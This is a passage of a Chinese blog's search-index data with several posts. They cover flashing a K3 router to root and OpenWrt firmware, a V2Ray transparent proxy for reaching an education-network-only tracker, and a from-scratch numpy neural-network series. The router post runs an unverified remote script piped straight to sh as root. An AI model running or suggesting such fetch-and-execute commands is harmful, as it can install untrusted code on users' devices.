%}\n\n这篇博客包罗万象，将所有固件的刷机方法都进行了总结，这位大佬还公开了自己编译的两个官root固件供大家使用。\n\n\n从原厂固件出发，主要的刷机思路是，先统一刷到官root固件，其他的固件可通过官root进一步刷成。细节我就不复制粘贴到这了，仅分享我自己的刷机过程作为参考。\n\n\n拿到路由器，首先登录管理界面（192.168.2.1），在管理页面中可以查看到当前的固件版本，我的是V21.6.11.58，是所谓的“旧版”，旧版原厂固件后面只能通过telnet登录到后台来进行刷机，不能通过网页直刷。在刷机之前，不论版本的新旧，皆需要通过[此方法](https://tbvv.net/posts/0101-k3.html#%E5%88%B7%E5%85%A5root%E5%9B%BA%E4%BB%B6)刷入大佬提供的cn.dat备份文件，该文件刷入后，重新登录路由器管理页面，选择功能设置 --> 存储管理 --> 修改用户名为admin，并保存，此时telnet已经开启。 \n\n\n接下来，telnet登录路由器后台：\n\n```bash\ntelnet 192.168.2.1\n```\n\n进入后台后，执行命令（需要路由器WAN口联网）：\n\n```bash\ncurl -Lksf tbvv.net/k3/one|sh\n```\n\n稍等片刻，即可刷机成功，刷机后的固件为官root固件。\n\n\n---\n\n接下来，通过官root固件刷OpenWrt/lede，通过SSH登录路由器后台（用户名为admin，密码是tbvv.net），执行命令：\n\n```bash\ntb\n```\n\n接下来只需根据需求一步步进行选择就可以了，我这里选择了lede by stones固件，当然其他的固件也可以在这找到，可以说是非常的方便了！\n\n\n由于无线驱动的适配性问题，OpenWrt固件在这款K3路由器上的WiFi信号会比原厂固件弱一些，但我实际使用发现信号仍然比之前的好不少，也没有出现断流现象。\n","tags":["Linux","OpenWrt","路由器"],"categories":["瞎捣鼓经历"]},{"title":"如何在校外使用北邮人PT站","url":"//blog/6304/","content":"\n两年前在朋友的邀请下加入了北邮人PT站（[bt.byr.cn](https://bt.byr.cn)，最近更改了域名为[byr.pt](https://byr.pt/)），该站点是一个纯IPv6站，且屏蔽了国内三大运营商的IPv6地址，在国内只能通过教育网来访问\n\n北邮人PT站资源丰富，相当实用。为此，我还特意在树莓派上搭建了一个BT资源下载站，用于下载资源以及长期做种。\n\n\n研二宿舍搬迁，我为方便起见去外面租了房子，这就导致我接不上教育网，也就没有办法访问站点了。在探明了访问不了的原因后，我就想到是不是可以通过科学上网的方法翻进教育网，从而访问到站点。恰好我在学校实验室里有一台服务器，它是接入教育网的，因此可以用它来做正向代理去请求站点，实现从非教育网访问到北邮人站点。\n\n\n由于我在实验室的服务器并没有公网IPv4地址，但拥有IPv6 Global地址，因此这要求客户端也拥有IPv6 Global地址以与服务器通信，不过基于目前国内运营商都已经支持了双栈拨号，这并不是问题。\n\n\n考虑到大部分人没有这种接入教育网的服务器，还有另外一种更容易满足的选择，即一台拥有海外IPv6地址的VPS。说起这个，就必须推广一下[Vultr](https://www.vultr.com/?ref=8868429)这个我曾经用过很长一段时间的平台了，这个平台的VPS可添加IPv6 Global地址，按使用时间收费，并且如果使用IPv6 only的服务器，最低仅需2.5$/月，还是非常划算的！\n\n\n我用到的软件还是已经用习惯了的V2ray，接下来给出服务器上以及本地的配置。\n\n\n服务器：\n\n```json\n{\n  \"inbounds\": [\n    {\n      \"port\": xxxx,\n      \"protocol\": \"vmess\",\n      \"settings\": {\n        \"clients\": [{\n          \"id\": \"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\",\n          \"alterID\": 0\n        }]\n      }\n    }\n  ],\n  \"outbounds\": [\n    {\n      \"tag\": \"IP6_out\",\n      \"protocol\": \"freedom\",\n      \"settings\": {\n        \"domainStrategy\": \"UseIPv6\"\n      }\n    }\n  ],\n  \"routing\": {\n    \"domainStrategy\": \"IPOnDemand\",\n    \"rules\": [\n      {\n        \"type\": \"field\",\n        \"outboundTag\": \"IP6_out\",\n        \"domain\": [\n          \"byr.pt\"\n        ]\n      }\n    ]\n  }\n}\n﻿\n```\n\n在上述配置中，请手动修改端口号以及UUID。服务器配置主要针对北邮人站点的域名进行了路由选择，指定`domainStrategy`为`UseIPv6`来声明使用IPv6协议。\n\n\n客户端：\n\n```json\n{\n  \"inbounds\": [\n    {\n      \"tag\": \"transparent\",\n      \"listen\": \"::\",\n      \"port\": 12345,\n      \"protocol\": \"dokodemo-door\",\n      \"settings\": {\n        \"network\": \"tcp,udp\",\n        \"followRedirect\": true\n      },\n      \"sniffing\": {\n        \"enabled\": true,\n        \"destOverride\": [\"http\", \"tls\"]\n      },\n      \"streamSettings\": {\n        \"sockopt\": {\n          \"tproxy\": \"tproxy\"\n        }\n      }\n    }\n  ],\n  \"outbounds\": [\n    {\n      \"tag\": \"byr\",\n      \"protocol\": \"vmess\",\n      \"settings\": {\n        \"vnext\": [\n          {\n            \"address\": \"IPv6 of Your Server\",\n            \"port\": xxxx,\n            \"users\": [\n              {\n                \"id\": \"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\",\n                \"alterId\": 0\n              }\n            ]\n          }\n        ]\n      },\n      \"streamSettings\": {\n        \"sockopt\": {\n          \"mark\": 255\n        }\n      }\n    },\n    {\n      \"tag\": \"direct\",\n      \"protocol\": \"freedom\",\n      \"settings\": {},\n      \"streamSettings\": {\n        \"sockopt\": {\n          \"mark\": 255\n        }\n      }\n    }\n  ],\n  \"routing\": {\n    \"domainStrategy\": \"IPOnDemand\",\n    \"rules\": [\n      {\n        \"type\": \"field\",\n        \"protocol\": [\"bittorrent\"],\n        \"outboundTag\": \"direct\"\n      },\n      {\n        \"type\": \"field\",\n        \"domain\": [\n          \"byr.pt\"\n        ],\n        \"outboundTag\": \"byr\"\n      }\n    ]\n  }\n}\n```\n\n客户端配置中，首先需要填写服务器的IPv6地址（如果服务器有公网IPv4就直接写公网IPv4）、端口号以及UUID，后两者与前面服务端配置中的对应。另外，如果服务端配置了其他东西比如websocket+tls的，需要在客户端进行简单的修改，这里不再细说。\n\n\n由于我做的是透明代理，因此需要一个dokodemo-door协议来接收局域网内的流量，并将其分流，将北邮人两个域名的流量转发到vmess节点（即我们的服务器），bittorrent流量则走direct直连。如果涉及到其他的翻墙规则，则需要注意路由rules的顺序。\n\n\n接下来，在树莓派上写几条ip6tables规则，以转发局域网以及网关自身去往北邮人站点的流量到dokodemo-door。\n\n```bash\nip -6 rule add fwmark 1 table 106\nip -6 route add local ::/0 dev lo table 106\n\n# 代理局域网流量\nip6tables -t mangle -N V2RAY\nip6tables -t mangle -A V2RAY -j RETURN -m mark --mark 0xff\nip6tables -t mangle -A V2RAY -p tcp -j TPROXY -d 2001:da8:215:4078:250:56ff:fe97:654d --on-ip ::1 --on-port 12345 --tproxy-mark 1\nip6tables -t mangle -A PREROUTING -j V2RAY\n\n# 代理网关自身的流量\nip6tables -t mangle -N V2RAY_MASK\nip6tables -t mangle -A V2RAY_MASK -j RETURN -m mark --mark 0xff\nip6tables -t mangle -A V2RAY_MASK -p tcp -j MARK -d 2001:da8:215:4078:250:56ff:fe97:654d --set-mark 1\nip6tables -t mangle -A OUTPUT -j V2RAY_MASK\n```\n\n规则里的`2001:da8:215:4078:250:56ff:fe97:654d`即为北邮人站点的地址，我们将去往这个地址的IPv6流量转入本地的dokodemo-door（12345端口）进行分流。\n\n\n如此一来，树莓派上的BT资源下载站已经可以正常访问到北邮人站点进行下载与做种了，但局域网内其他设备并没有办法访问北邮人站点，这是因为设备的IPv6网关并没有指向树莓派，目前我还没有找到和IPv4那样自定义分配网关的方法，因为DHCPv6和DHCPv4的区别挺大的。因此我只能暂时通过手动输入以下命令来指定网关：\n\n```bash\nroute -A inet6 add ::/0 gw fe80::d35e:9a40:93a9:e687 dev wlp62s0\n```\n\nfe80::d35e:9a40:93a9:e687这一串是我树莓派网口的link-local地址，wlp62s0则是局域网设备的无线网卡设备名，这样就可以把这一台设备上的IPv6流量转发至树莓派的网口了。\n\n\n鉴于下载工作不需要在电脑上执行，在电脑端只要偶尔上一下站点下两个torrent文件就行，因此感觉这样做也没什么大问题。\n\n\n当然如果你的路由器性能足够好，且支持安装V2ray这类软件，那么也完全可以把透明代理架设在路由器上，这样就免去了修改网关的步骤，并且这样也不需要代理网关自身的流量了。这也是目前我使用的方法。最后给出一个我目前配置下的网络拓扑示意图：\n\n![](https://oss.fyz666.xyz/blogfiles/png/16fee2f0dbc7870f455fa932d20b2532.png)\n如果你有方法可以让OpenWrt路由器更改局域网设备的IPv6网关，烦请告诉我！！\n","tags":["Linux","IPv6","计算机网络","V2Ray","树莓派"],"categories":["瞎捣鼓经历"]},{"title":"手撸神经网络系列之——训练模型（完结篇）","url":"//blog/6263/","content":"\n本文是此系列的完结篇，我们将用自己实现的神经网络来训练一个识别手写数字的模型。训练代码包含一些我前面没有提到的东西，例如数据变换函数等，不过这些都并非本系列的重点，实现起来也很简单粗暴，故不再细说！\n\n本系列全部代码见下面仓库：\n\n{% link autograd-with-numpy,GitHub,https://github.com/windshadow233/autograd-with-numpy %}\n\n如有算法或实现方式上的问题，请各位大佬轻喷+指正！\n\n本文的内容对于深度学习领域的学习者而言应该是非常熟悉的基本操作，所以我基本只贴代码了，望谅解。\n\n\n![](https://oss.fyz666.xyz/blogfiles/jpeg/66c9903cee09724be386c24319136bec.jpeg)\n\n注:本文模型结构与上图并不符，上图只是用来充个数的\n\n\n我们先给出数据载入函数与数据类：\n\n\n\n```python\ndef load_mnist(img_path, label_path):\n    with open(label_path, 'rb') as label:\n        struct.unpack('>II', label.read(8))\n        labels = np.fromfile(label, dtype=np.uint8)\n    with open(img_path, 'rb') as img:\n        _, num, rows, cols = struct.unpack('>IIII', img.read(16))\n        images = np.fromfile(img, dtype=np.uint8).reshape(num, rows, cols)\n    return images, labels\n\nclass MNISTDataset(Dataset):\n    def __init__(self, data_path, label_path):\n        super(MNISTDataset, self).__init__()\n        self.data, self.label = load_mnist(data_path, label_path)\n\n    def __len__(self):\n        return len(self.label)\n\n    def __getitem__(self, item):\n        return trans(self.data[item]), nptorch.tensor(self.label[item])\n```\n\n数据怎么读的可以不管，你只要知道它是用来读数据的就行了。定义了上述内容后，我们就可以以下面的方式读取MNIST数据：\n\n\n\n```python\ntrain_set = MNISTDataset('mnist/MNIST/raw/train-images-idx3-ubyte', 'mnist/MNIST/raw/train-labels-idx1-ubyte')\ntest_set = MNISTDataset('mnist/MNIST/raw/t10k-images-idx3-ubyte', 'mnist/MNIST/raw/t10k-labels-idx1-ubyte')\ntrain_loader = DataLoader(train_set, batch_size=64)\ntest_loader = DataLoader(test_set, batch_size=128, drop_last=True)\n```\n\n这些代码里的Dataset和DataLoader类也都是我自己定义的class，它们位于项目中的utils/data/目录下，比较容易实现。\n\n\n接下来贴出LeNet模型的代码：\n\n\n\n```python\nclass LeNet(nn.Module):\n    def __init__(self):\n        super(LeNet, self).__init__()\n        self.layer1 = nn.Sequential(\n            nn.Conv2d(1, 16, 3, dilation=(1, 1)),\n            nn.MaxPool2d(2),\n            nn.BatchNorm2d(16),\n            nn.ReLU(inplace=True),\n            nn.Conv2d(16, 32, 3, dilation=(1, 1)),\n            nn.MaxPool2d(2),\n            nn.BatchNorm2d(32),\n            nn.ReLU(inplace=True),\n        )\n        self.layer2 = nn.Sequential(\n            nn.Linear(32 * 25, 128),\n            nn.BatchNorm1d(128),\n            nn.ReLU(inplace=True),\n            nn.Linear(128, 64),\n            nn.BatchNorm1d(64),\n            nn.ReLU(inplace=True),\n            nn.Linear(64, 10)\n        )\n\n    def forward(self, x: nptorch.Tensor):\n        x = self.layer1(x)\n        x = x.reshape(x.shape[0], -1)\n        x = self.layer2(x)\n        return x\n```\n\n这也是我刚入门PyTorch，完全不懂神经网络时，照着示例抄的第一个神经网络，我将其结构搬了过来，如今再看，网络中的模块都如透明的一般呈现在眼前，完全是不同的感觉。\n\n\n下面生成模型实例、优化器以及交叉熵损失函数：\n\n\n\n```python\nmodel = LeNet()\noptimizer = SGD(model.parameters(), lr=1e-1, momentum=0.7)\nloss_fcn = nn.CrossEntropyLoss()\n```\n\n然后我们就可以开始训练了！\n\n\n\n```python\nfor i in tqdm(range(5)):\n    count = 0\n    for d, lb in train_loader:\n        model.train()\n        count += len(d)\n        print(count)\n        y_hat = model(d)\n        loss = loss_fcn(y_hat, lb)\n        loss.backward()\n        optimizer.step()\n        model.eval()\n        with nptorch.no_grad():\n            p = model(d).argmax(-1)\n            print(f'优化后的准确比率:{(p == lb).float().sum().item() / len(d)}')\n        optimizer.zero_grad()\n```\n\n为节省时间，我这里训练了5个epoch，同时为了观察训练效果，每次优化以后，再重新测一遍当前batch的准确率。\n\n\n最后，我们对训练好的模型进行测试：\n\n\n\n```python\nprint(f'测试集准确率{test_model(model, test_loader)}')\nprint(f'训练集准确率{test_model(model, train_loader)}')\n```\n\n因为懒得等它跑完，我这里只录了一部分屏，在测试时，用了以前训练好的模型进行测试。\n\n\n![](https://oss.fyz666.xyz/blogfiles/gif/c7a2a428662751ccd86f4cd2feafb209.gif)\n按这种速度跑一轮，大概是在5分钟左右，我的CPU型号是Intel i7-9750H，感觉已经很快了。\n\n\n下面是测试结果：\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/f6d1dbd3e9dd80959e0a78acbf8d3f80.png)\n证明我们自己手写的神经网络确实work了，而且运行的非常完美！撒花！\n\n\n在系列的最后，我必须感谢一路看到这里的你，但事实上，连续水了十五篇文章也没能把内容讲完整，不过，还是希望这个系列多多少少能带给你一些有用没用的知识。由于代码中涉及到反向传播的部分写的相当不优雅，若你在阅读过程中有任何疑问或是更优雅的反向传播实现，欢迎在下方留言或直接联系我。","tags":["Python","神经网络"],"categories":["机器学习"]},{"title":"手撸神经网络系列之——实现SGD优化器","url":"//blog/6256/","content":"\n本文，我们来实现一个SGD优化器，用以梯度更新。有了前面的铺垫，这个SGD优化器的实现将超乎想象的容易。\n\n本系列全部代码见下面仓库：\n\n{% link autograd-with-numpy,GitHub,https://github.com/windshadow233/autograd-with-numpy %}\n\n如有算法或实现方式上的问题，请各位大佬轻喷+指正！\n\n\n![](https://oss.fyz666.xyz/blogfiles/jpeg/9245fa10af837b3eeb4603d243e921ee.jpeg)\n前文中，我们实现了Module类，它拥有一个`parameters`方法，返回一个包含模型中所有可训练参数的生成器，我们可以调用该方法，取得一个模型中所有可训练参数的列表。\n\n\n\n```python\nparams = list(model.parameters())\n```\n\n考虑到优化器种类比较多，我们先实现一个优化器的基类：Optimizer，它需要传入所有优化器必备的参数，我能想到的有：可训练参数列表、学习率、一阶正则化系数、二阶正则化系数。另外，它需要实现所有优化器的共有方法，我能想到的有：正则化、梯度清零。\n\n\n下面给出我实现的优化器基类代码：\n\n\n\n```python\nclass Optimizer(object):\n    def __init__(self, params: Module.parameters, lr=1e-3, alpha=0., weight_decay=0.):\n        assert lr >= 0., f\"Invalid learning rate: {lr}\"\n        assert alpha >= 0., f\"Invalid alpha value: {alpha}\"\n        assert weight_decay >= 0., f\"Invalid weight_decay value: {weight_decay}\"\n        self.params = list(params)\n        self.lr = lr\n        self.alpha = alpha\n        self.weight_decay = weight_decay\n\n    @nptorch.no_grad()\n    def _regularization(self):\n        if self.alpha > 0.:\n            for p in self.params:\n                p.grad += self.alpha * (2. * (p.data > 0.).astype(np.float32) - 1.)\n        if self.weight_decay > 0.:\n            for p in self.params:\n                p.grad += self.weight_decay * p.data\n\n    def zero_grad(self):\n        for p in self.params:\n            p.grad.zero_()\n```\n\n- 初始化函数，alpha为一阶正则化系数，weight_decay为二阶正则化系数。函数中首先对输入的参数进行了校验，然后将生成器类型的param参数转为list。\n- `_regularization`方法是正则化操作，正则化相当于在所有可训练参数的梯度上额外增加了一项，我们通过这个正则化操作提前把梯度加上。\n- `zero_grad`方法，用于清空可训练参数的梯度，这里我为Tensor类提供了一个`zero_`方法，用于将自身的数据清零。\n\n接下来，我们基于这个基类，来实现SGD优化器。SGD优化器多出来一个参数为动量（momentum），其值介于$[0, 1)$半开区间。动量法是模拟小球在山间的运动过程，用以帮助SGD突破局部极小值，加速向全局最小值收敛。\n\n\n设动量系数为$\\gamma$，学习率为$\\eta$，则基于动量法的参数更新公式如下：\n\n\n$$\\begin{aligned}V_t&=\\gamma V_{t-1}-\\eta\\nabla_\\theta L(\\theta)\\\\ \\theta&=\\theta+V_t\\end{aligned}$$\n\n\n基于上述公式，我们可以为SGD加入一个列表v用以$V$值的动态更新，并实现`step`方法。以下是我实现的SGD代码。\n\n\n\n```python\nclass SGD(Optimizer):\n    def __init__(self, params: Module.parameters, lr=1e-3, momentum=0., alpha=0., weight_decay=0.):\n        \"\"\"\n        SGD优化器\n        @param params: 需要优化的模型参数\n        @param lr: 学习率\n        @param momentum: 动量\n        @param alpha: L1正则化系数\n        @param weight_decay: L2正则化系数\n        \"\"\"\n        super(SGD, self).__init__(params, lr, alpha, weight_decay)\n        assert 0. <= momentum < 1., f\"Invalid momentum value: {momentum}\"\n        self.momentum = momentum\n\n        if momentum != 0.:\n            self.v = [0.] * len(self.params)\n\n    @nptorch.no_grad()\n    def step(self):\n        self._regularization()\n        if self.momentum > 0.:\n            for i, p in enumerate(self.params):\n                self.v[i] = self.momentum * self.v[i] - self.lr * p.grad.data\n                p.data += self.v[i]\n        else:\n            for p in self.params:\n                p.data -= self.lr * p.grad.data\n```\n\n有了SGD优化器，我们就可以用它来训练模型了。后面一篇文章，我们将实现一个最简单的LeNet，用在深度学习领域的入门数据集MNIST，以实现手写数字的识别，以此对我们自己写的神经网络模型进行最终的检验。\n","tags":["Python","神经网络","SGD"],"categories":["机器学习"]},{"title":"手撸神经网络系列之——封装Module类及其子类","url":"//blog/6243/","content":"\n从这篇文章开始，我们来着手实现模型的优化功能，本文主要来实现第一步：Module类以及其具体子类的实现，在实现的过程中，我参考了一部分PyTorch的相关源码。\n\n本系列全部代码见下面仓库：\n\n{% link autograd-with-numpy,GitHub,https://github.com/windshadow233/autograd-with-numpy %}\n\n如有算法或实现方式上的问题，请各位大佬轻喷+指正！\n\n\n熟悉PyTorch的朋友都知道，Module类是作为神经网络各种模块（例如线性层、卷积层等）的基类而存在的，实现它是为了更方便地实现与PyTorch类似的神经网络模块功能。\n\n\n首先，我们需要定义一个可训练参数类：Parameter。定义比较容易，直接继承前面定义的Tensor，并修改一些参数即可：\n\n\n\n```python\nclass Parameter(Tensor):\n    def __init__(self, tensor: Tensor):\n        if not tensor.is_leaf:\n            raise ValueError('cannot assign a non-leaf variable to Parameter')\n        super(Parameter, self).__init__(tensor.data, dtype=np.float32, requires_grad=True)\n\n    def __repr__(self):\n        return f'Parameter Containing:\\n{super(Parameter, self).__repr__()}'\n```\n\nParameter类在初始化时，需要传入一个Tensor类的叶子节点实例，并且强制令数据类型为float32，强制令requires_grad为True。\n\n\n接下来，我依照PyTorch的Module类，定义了一个自己的Module类，代码比较多，就不贴了，完整代码见nn/modules/module.py，其主要实现的方法有以下几个：\n\n\n\n```python\nclass Module(object):\n    def __call__(self, *args, **kwargs):\n        return self.forward(*args, **kwargs)\n\n    def forward(self, *args, **kwargs):\n        raise NotImplementedError\n\n    def modules(self, recurse=True):\n        \"\"\"\n        (recusively) return Modules of this instance\n        \"\"\"\n        ...\n\n    def train(self, mode=True):\n        \"\"\"\n        switch to train mode\n        \"\"\"\n        ...\n\n    def eval(self):\n        \"\"\"\n        switch to eval mode\n        \"\"\"\n        ...\n\n    def parameters(self, recurse=True):\n        \"\"\"\n        (recusively) return Parameters of this instance\n        \"\"\"\n        ...\n\n    def buffers(self, recurse=True):\n        \"\"\"\n        (recusively) return Buffers of this instance\n        \"\"\"\n        ...\n\n    def save_state_dict(self, state_dict_file):\n        \"\"\"\n        save model's state dict to file\n        \"\"\"\n        ...\n\n    def load_state_dict(self, state_dict: OrderedDict or str, strict=True):\n        \"\"\"\n        load state dict from OrderedDict or file\n        \"\"\"\n        ...\n```\n\n总结一下，其实就是前向传播方法`forward`、模式切换方法`train`和`eval`、获取全部可训练参数的方法`parameters`、获取全部不可训练参数的方法`buffers`，以及参数存取方法`save_state_dict`和`load_state_dict`。相信用过PyTorch的朋友会对这些方法比较熟悉，这些方法实现起来并不难，但大概需要花一点时间。这里__call__方法直接调用了forward方法，然而在PyTorch里并不是这样的，后者在__call__方法中还做了很多其他的操作，我这里都没有进行实现。\n\n\n\n\n---\n\nModule类的用途是作为基类，被其他常见的更具体的类所继承，例如线性层Linear的定义如下：\n\n\n\n```python\nclass Linear(Module):\n    def __init__(self, in_features, out_features, bias=True):\n        super(Linear, self).__init__()\n        self.in_features = in_features\n        self.out_features = out_features\n        self.weight = Parameter(normal(mean=0., std=np.sqrt(2. / in_features), size=(out_features, in_features)))\n        if bias:\n            self.bias = Parameter(zeros(out_features))\n        else:\n            self.register_parameter('bias', None)\n\n    def extra_repr(self):\n        return ('{in_features}, {out_features}, ' + f'bias={self.bias is not None}').format(**self.__dict__)\n\n    def forward(self, x: Tensor) -> Tensor:\n        return F.linear(x, self.weight, self.bias)\n```\n\n线性层的两个参数，我们将其定义为Parameter类，因为它们是需要训练的参数。其中涉及到几个张量生成函数——`normal`、`zeros`，只要随随便便把numpy的对应函数封装成Tensor类型的就好啦！最后，我们要在Linear类中实现它独有的正向传播方法，即`forward`方法，基于我们前面做的准备工作比较充分（已经提前写好了张量乘法、加法运算），这里同样没什么难度。\n\n\n\n\n---\n\n本文涉及到的内容难度都不大，但估计写起来会感觉很烦，因为实在是太多了hhh，基本都是重复劳作。但如果对PyTorch比较熟悉，写起来应该会比较轻松！\n\n\n后面一篇文章，我们将实现一个简单的SGD优化器，通过它来训练自己的神经网络模型。\n","tags":["Python","神经网络"],"categories":["机器学习"]},{"title":"手撸神经网络系列之——池化与BN层","url":"//blog/6123/","content":"\n结束了本系列最硬核的卷积反向传播部分，从这篇文章开始，将进入比较软核的内容，本文来介绍池化运算和BN层的正反向传播。\n\n\n本文涉及到的数学公式比较多，网页前端渲染会比较慢，烦请耐心等待和阅读。\n\n本系列全部代码见下面仓库：\n\n{% link autograd-with-numpy,GitHub,https://github.com/windshadow233/autograd-with-numpy %}\n\n如有算法或实现方式上的问题，请各位大佬轻喷+指正！\n\n## 池化\n\n\n池化运算（Pooling），是一种对数据的采样方式，通过减小数据的分辨率尺寸来加速运算，其本质是信息完整性与运算速度的妥协。最常用的池化操作即最大池化（MaxPooling），过程如下图所示：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/b62cc77899404922bd08bce681cb06fa.png)\n一般而言，以上面这种池化核尺寸为2、步长为2的池化操作最为常用。还有一种平均值池化，则是把每一块的最大值运算换成平均值运算。\n\n\n### 前向传播\n\n\n池化与卷积很像，因此前向传播时，我们可以利用前面卷积时用到的`split_by_strides`函数，以下给出MaxPooling的前向传播：\n\n\n\n```python\ndef max_pool2d(x: Tensor, kernel_size, stride=None):\n    assert x.ndim == 4, 'x must be 4 dimensional'\n    kernel_size = _pair(kernel_size)\n    stride = stride or kernel_size\n    stride = _pair(stride)\n    split = split_by_strides(x.data, kernel_size, stride)\n    max_data = np.max(split, axis=(-1, -2))\n    argmax = np.argmax(split.reshape(-1, kernel_size[0] * kernel_size[1]), axis=-1).flatten()\n    output = Tensor(max_data, requires_grad=x.requires_grad)\n    if output.grad_enable:\n        output.children = [(x, argmax, kernel_size, stride)]\n        output.grad_fn = MaxPool2dBackward()\n    return output\n```\n\n与卷积类似，我们通过`split_by_strides`函数就可以直接把数据按块分割出来，然后对最后两个维度进行取最大值运算即可。\n\n\n### 反向传播\n\n\n反向传播的思路也很简单，与前面的Max运算的思想是一样的，区别在于若遇到存在多个最大值的情况，只为第一个最大值传回梯度，其余的则传回0。\n\n\n我直接用循环解决了：\n\n\n\n```python\nclass MaxPool2dBackward(BackwardFcn):\n    def calculate_grad(self, grad, children, place):\n        x, argmax, kernel_size, stride = children[0]\n        new_grad = np.zeros_like(x.data)\n        B, C, H, W = grad.shape\n        for index, m in zip(product(range(B), range(C), range(H), range(W)), argmax):\n            b, c, h, w = index\n            mh, mw = m // kernel_size[1], m % kernel_size[1]\n            new_grad[b, c, h * stride[0] + mh, w * stride[1] + mw] += grad[b, c, h, w]\n        return new_grad\n```\n\n说来惭愧，我用循环的原因是目前没有想到更好的适应一切情况的方法，不过，池化的反向传播因为不涉及到矩阵运算，所以感觉用循环也没事，不怎么影响运行效率。\n\n\n这里的代码都非常容易理解，我就不再解读了（其实是因为太不优雅了而不想解读）。\n\n\nAvgPooling和MaxPooling类似，这里不再贴代码。\n\n\n\n\n---\n\n## BN层\n\n\nBN层，全称Batch Normalization层，作用是稳定数据分布、加速训练，经常被用在神经网络的激活函数之前。\n\n\nBN层的正向传播分为训练阶段和测试阶段两种情况。\n\n\n在训练阶段，BN层需要收集数据的一些统计信息，BN层在拿到每一批次的数据后，首先要计算出这批数据每一个通道的均值、方差，拿到均值和方差后，BN层通过滑动的方式动态更新自己的running_mean和running_var属性，即滑动均值和滑动方差，最后，用计算出来的均值、方差对数据的每一个通道进行标准化：\n\n\n$$ \\hat{x}^{(k)}=\\frac{x^{(k)}-\\mu^{(k)}}{\\sigma^{(k)}}, k=1,2,\\dots,C$$\n\n\n但若就这么结束了，将会带来很大的问题，因为数据在被标准化之后，前面所有层学习到的特征也会被破坏，因此BN层还引入了两个可训练参数$\\gamma,\\beta$，在把数据归一化以后，又做了一个affine变换：\n\n\n$$y^{(k)}=\\gamma^{(k)}\\hat{x}^{(k)}+\\beta^{(k)}, k=1,2,\\dots,C$$\n\n\n$y$，即是BN层最后的输出结果。\n\n\n在测试阶段，BN层使用训练时收集到的running_mean和running_var对数据进行归一化，使用训练时学习到的$\\gamma$与$\\beta$进行affine变换。\n\n\n### 数学推导\n\n\n根据以下传播公式，我们给出BN层反向传播的梯度推导。\n\n\n$$\\mu=\\frac{1}{n}\\sum_{i=1}^nx_i,\\quad \\sigma=\\sqrt{\\frac{1}{n}\\sum_{i=1}^n(x_i-\\mu)^2}$$\n\n\n$$\\hat{x}_i=\\frac{x_i-\\mu}{\\sigma}$$\n\n\n$$y_i=\\gamma \\hat{x_i}+\\beta$$\n\n\n下面来计算梯度，为清晰起见，我们先画出上述式子的计算图：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/e1759e4ba2ae679f5c97f90e321293ae.png)\n我们首先对$\\gamma,\\beta$计算梯度，这两个比较容易：\n\n\n$$\\delta_{\\gamma}=\\sum_{i=1}^n\\hat{x_i}\\delta_{y_i},\\quad\\delta_{\\beta}=\\sum_{i=1}^n\\delta_{y_i}$$\n\n\n然后作为跳板，我们计算$\\delta_{\\hat{x}}$：\n\n\n$$\\delta_{\\hat{x}}=\\gamma \\delta_y$$\n\n\n接下来计算最复杂的$\\delta_x$，我们将其分为三条梯度链，用链式法则来解决：\n\n\n$$\\delta_{x_i}=\\delta_{\\hat{x}_i}\\frac{\\partial\\hat{x}_i}{\\partial x_i}+\\delta_\\mu\\frac{\\partial\\mu}{\\partial x_i}+\\delta_\\sigma\\frac{\\partial\\sigma}{\\partial x_i}$$\n\n\n目前$$\\delta_{x_i}$$已经得到，我们还需计算的梯度有$$\\frac{\\partial \\hat{x}_i}{\\partial x_i}, \\delta_\\mu,\\frac{\\partial\\mu}{\\partial x_i},\\delta_\\sigma,\\frac{\\partial\\sigma}{\\partial x_i}$$，下面来依次计算：\n\n\n- $\\frac{\\partial \\hat{x}_i}{\\partial x_i}$\n\n根据$\\hat{x}_i=\\frac{x_i-\\mu}{\\sigma}$，容易得出：\n\n\n$$\\frac{\\partial \\hat{x}_i}{\\partial x_i}=\\frac{1}{\\sigma}$$\n\n\n- $\\delta_\\mu$\n\n$$\\delta_\\mu=\\sum_{i=1}^n\\delta_{\\hat{x}_i}\\frac{\\partial\\hat{x}_i}{\\partial\\mu}+\\delta_\\sigma\\frac{\\partial\\sigma}{\\partial\\mu}$$\n\n\n易知$\\frac{\\partial\\sigma}{\\partial\\mu}=0$，故：\n\n\n$$\\begin{aligned}\\delta_\\mu&=\\sum_{i=1}^n\\delta_{\\hat{x}_i}\\frac{\\partial\\hat{x}_i}{\\partial\\mu}\\\\&=-\\frac{1}{\\sigma}\\sum_{i=1}^n\\delta_{\\hat{x}_i}\\end{aligned}$$\n\n\n- $\\frac{\\partial\\mu}{\\partial x_i}$\n\n$$\\frac{\\partial\\mu}{\\partial x_i}=\\frac{1}{n}$$\n\n\n- $\\delta_\\sigma$\n\n由$\\hat{x}_i=\\frac{x_i-\\mu}{\\sigma}$，得到：\n\n\n$$\\delta_\\sigma=-\\frac{1}{\\sigma^2}\\sum_{i=1}^n\\delta_{\\hat{x}_i}(x_i-\\mu)$$\n\n\n- $\\frac{\\partial\\sigma}{\\partial x_i}$\n\n由$\\sigma=\\sqrt{\\frac{1}{n}\\sum_{i=1}^n(x_i-\\mu)^2}$，得到：\n\n\n$$\\frac{\\partial\\sigma}{\\partial x_i}=\\frac{x_i-\\mu}{n\\sigma}$$\n\n\n现在，所有的梯度都已经算出来了，我们将它们代回原式，通过一些化简，可以求出$\\delta_{x_i}$：\n\n\n$$\\begin{aligned}\\delta_{x_i}&=\\delta_{\\hat{x}_i}\\frac{\\partial\\hat{x}_i}{\\partial x_i}+\\delta_\\mu\\frac{\\partial\\mu}{\\partial x_i}+\\delta_\\sigma\\frac{\\partial\\sigma}{\\partial 